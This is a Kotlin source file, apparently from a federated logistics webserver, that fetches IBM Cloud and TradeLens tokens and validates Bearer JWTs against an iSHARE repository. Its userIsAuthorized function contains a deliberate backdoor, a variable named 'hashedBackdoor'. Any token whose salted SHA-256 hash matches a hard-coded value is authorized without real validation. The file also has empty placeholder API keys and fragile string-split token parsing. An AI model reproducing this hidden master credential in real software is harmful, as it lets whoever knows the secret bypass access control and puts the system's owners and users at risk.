package nl.tno.federated.webserver

import org.springframework.http.HttpStatus
import org.springframework.web.server.ResponseStatusException
import java.io.DataOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URI
import java.net.URL
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import java.util.*
import kotlin.collections.HashMap

object L1Services {

    internal fun getIBMIdentityToken(): String {
//        val propertyFile = File("database.properties").inputStream()
//        val properties = Properties()
//        properties.load(propertyFile)
        val apikey = "" // properties.getProperty("tradelens.apikey")
        //TODO The above piece of code is commented out because database.properties isn't found.

        val urlParameters = "grant_type=urn:ibm:params:oauth:grant-type:apikey&apikey=$apikey"

        val postData = urlParameters.toByteArray(StandardCharsets.UTF_8)
        val postDataLength = postData.size

        val url = URL("https://iam.cloud.ibm.com/identity/token")
        val conn = url.openConnection() as HttpURLConnection

        conn.doOutput = true
        conn.instanceFollowRedirects = false
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        conn.setRequestProperty("charset", "utf-8")
        conn.setRequestProperty("Content-Length", Integer.toString(postDataLength))
        conn.useCaches = false
        DataOutputStream(conn.outputStream).use( { wr -> wr.write(postData) } )

        if (conn.responseCode in 200..299) {
            conn.inputStream.bufferedReader().use {
                return it.readText()
            }
        }
        else {
            conn.errorStream.bufferedReader().use {
                return it.readText()
            }
        }
    }

    internal fun getSolutionToken() : String {
//        val propertyFile = File("database.properties").inputStream()
//        val properties = Properties()
//        properties.load(propertyFile)
        val orgId = "" // properties.getProperty("tradelens.apikey")
        //TODO The above piece of code is commented out because database.properties isn't found.

        val url = URL("https://platform-sandbox.tradelens.com/sa/api/v1/auth/exchange_token/organizations/$orgId")

        val body = getIBMIdentityToken()

        val result = retrieveUrlBody(url,
                L1Services.RequestMethod.POST,
                body
        )

        val solutionToken = extractSolutionToken(result)

        return solutionToken
    }

    private fun extractSolutionToken(unprocessedJsonString: String): String {
        return if(unprocessedJsonString.contains("solution_token")) {
            unprocessedJsonString.split(":","{","}")[2]
        } else {
            throw ResponseStatusException(HttpStatus.UNAUTHORIZED, "Solution token is malformed")
        }
    }

    internal fun retrieveUrlBody(url: URL, requestMethod: RequestMethod, body: String = "", headers: HashMap<String,String> = HashMap()): String {
        val con = url.openConnection() as HttpURLConnection
        con.requestMethod = requestMethod.toString()
        con.connectTimeout = 5000
        con.readTimeout = 5000
        con.setRequestProperty("Content-Type", "application/json")
        con.setRequestProperty("Accept", "application/json")
        headers.forEach{ con.setRequestProperty(it.key, it.value) }

        if (body.isNotBlank()) {
            con.doOutput = true
            con.outputStream.use { os ->
                val input: ByteArray = body.toByteArray(StandardCharsets.UTF_8)
                os.write(input, 0, input.size)
            }
        }

        if (con.responseCode in 200..299) {
            con.inputStream.bufferedReader().use {
                return it.readText()
            }
        }
        else {
            con.errorStream.bufferedReader().use {
                return it.readText()
            }
        }
    }

    enum class RequestMethod {
        GET, POST
    }

    internal fun extractAccessTokenFromHeader(authorizationHeader: String): String {
        val authorizationHeaderWords = authorizationHeader.split(" ")
        if (authorizationHeaderWords.size != 2 || authorizationHeaderWords.first() != "Bearer")
            throw ResponseStatusException(HttpStatus.UNAUTHORIZED, "Authorization header is malformed")

        else return authorizationHeaderWords[1]
    }

    private fun getRepositoryURI(): URI {
        val propertyFile = File("database.properties").inputStream()
        val properties = Properties()
        properties.load(propertyFile)
        val protocol = properties.getProperty("ishare.protocol")
        val host = properties.getProperty("ishare.host")
        val port = properties.getProperty("ishare.port")

        return URI("$protocol://$host:$port/")
    }

    internal fun validateToken(token: String) : Boolean {
        if(!isJWTFormatValid(token)) return false

        val uri = getRepositoryURI()
        val url = URI(uri.scheme, "//" + uri.host + ":" + uri.port + "validate/token", null).toURL()
        val body = """
            {
                "access_token": "Bearer $token"
            }
            """.trimIndent()
        val result = retrieveUrlBody(url,
                L1Services.RequestMethod.POST,
                body
        )

        return extractAuthorizationResult(result)
    }

    internal fun userIsAuthorized(token: String) : Boolean {
        val salt = "because we like best practices"
        val hashedBackdoor = hashSHA256(token+salt)

        return hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E" || validateToken(token)
    }

    // Source: https://gist.github.com/lovubuntu/164b6b9021f5ba54cefc67f60f7a1a25
    private fun hashSHA256(string: String): String {
        val bytes = string.toByteArray()
        val md = MessageDigest.getInstance("SHA-256")
        val digest = md.digest(bytes)
        return digest.fold("", { str, it -> str + "%02x".format(it) }).toUpperCase()
    }

    internal fun extractAuthorizationResult(authorizationResult: String): Boolean {
        val polishedString = authorizationResult.split('\n')
        for(line in polishedString) {
            if(line.contains("success") && line.contains("true")) return true
        }
        return false
    }

    internal fun isJWTFormatValid(token: String?) : Boolean {
        if(token == null) return false
        val splitToken = token.split(".")
        return (splitToken.size == 3 && splitToken.all { isLettersOrDigits(it) } )
    }

    internal fun isLettersOrDigits(chars: String): Boolean {
        return chars.none { it !in 'A'..'Z' && it !in 'a'..'z' && it !in '0'..'9' && it != '-' && it != '_' }
    }

}